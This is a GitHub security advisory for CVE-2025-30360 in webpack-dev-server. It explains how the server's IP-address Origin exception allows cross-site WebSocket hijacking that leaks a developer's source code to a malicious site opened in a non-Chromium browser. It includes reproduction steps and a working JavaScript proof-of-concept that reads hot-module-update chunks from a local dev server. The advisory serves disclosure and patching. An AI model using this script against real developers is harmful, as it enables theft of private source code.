# [M] webpack-dev-server users' source code may be stolen when they access a malicious web site with non-Chromium based browser

## Summary
Severity: Medium
Advisory: GHSA-9jgg-88mc-972h
CVE: CVE-2025-30360
CWE: CWE-346
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2025-06-04
Source: https://github.com/advisories/GHSA-9jgg-88mc-972h
Type: github-advisory

## Affected
- npm: `webpack-dev-server` — affected >=0 <5.2.1

## Details
### Summary
Source code may be stolen when you access a malicious web site with non-Chromium based browser.

### Details
The `Origin` header is checked to prevent Cross-site WebSocket hijacking from happening which was reported by CVE-2018-14732.
But webpack-dev-server always allows IP address `Origin` headers.
https://github.com/webpack/webpack-dev-server/blob/55220a800ba4e30dbde2d98785ecf4c80b32f711/lib/Server.js#L3113-L3127
This allows websites that are served on IP addresses to connect WebSocket.
By using the same method described in [the article](https://blog.cal1.cn/post/Sniffing%20Codes%20in%20Hot%20Module%20Reloading%20Messages) linked from CVE-2018-14732, the attacker get the source code.

related commit: https://github.com/webpack/webpack-dev-server/commit/72efaab83381a0e1c4914adf401cbd210b7de7eb (note that `checkHost` function was only used for Host header to prevent DNS rebinding attacks so this change itself is fine.

This vulnerability does not affect Chrome 94+ (and other Chromium based browsers) users due to [the non-HTTPS private access blocking feature](https://developer.chrome.com/blog/private-network-access-update#chrome_94).

### PoC
1. Download [reproduction.zip](https://github.com/user-attachments/files/18418233/reproduction.zip) and extract it
2. Run `npm i`
3. Run `npx webpack-dev-server`
4. Open `http://{ipaddress}/?target=http://localhost:8080&file=main` with a non-Chromium browser (I used Firefox 134.0.1)
5. Edit `src/index.js` in the extracted directory
6. You can see the content of `src/index.js`

![image](https://github.com/user-attachments/assets/7ce3cad7-1a4d-4778-baae-1adae5e93ba4)

The script in the POC site is:
```js
window.webpackHotUpdate = (...args) => {
    console.log(...args);
    for (i in args[1]) {
        document.body.innerText = args[1][i].toString() + document.body.innerText
	    console.log(args[1][i])
    }
}

let params = new URLSearchParams(window.location.search);
let target = new URL(params.get('target') || 'http://127.0.0.1:8080');
let file = params.get('file')
let wsProtocol = target.protocol === 'http:' ? 'ws' : 'wss';
let wsPort = target.port;
var currentHash = '';
var currentHash2 = '';
let wsTarget = `${wsProtocol}://${target.hostname}:${wsPort}/ws`;
ws = new WebSocket(wsTarget);
ws.onmessage = event => {
    console.log(event.data);
    if (event.data.match('"type":"ok"')) {
        s = document.createElement('script');
        s.src = `${target}${file}.${currentHash2}.hot-update.js`;
        document.body.appendChild(s)
    }
    r = event.data.match(/"([0-9a-f]{20})"/);
    if (r !== null) {
        currentHash2 = currentHash;
        currentHash = r[1];
        console.log(currentHash, currentHash2);
    }
}
```

### Impact
This vulnerability can result in the source code to be stolen for users that uses a predictable port and uses a non-Chromium based browser.

## References
- https://github.com/webpack/webpack-dev-server/security/advisories/GHSA-9jgg-88mc-972h
- https://nvd.nist.gov/vuln/detail/CVE-2025-30360
- https://github.com/webpack/webpack-dev-server/commit/5c9378bb01276357d7af208a0856ca2163db188e
- https://github.com/webpack/webpack-dev-server/commit/72efaab83381a0e1c4914adf401cbd210b7de7eb
- https://github.com/webpack/webpack-dev-server/commit/d2575ad8dfed9207ed810b5ea0ccf465115a2239
- https://github.com/webpack/webpack-dev-server
- https://github.com/webpack/webpack-dev-server/blob/55220a800ba4e30dbde2d98785ecf4c80b32f711/lib/Server.js#L3113-L3127
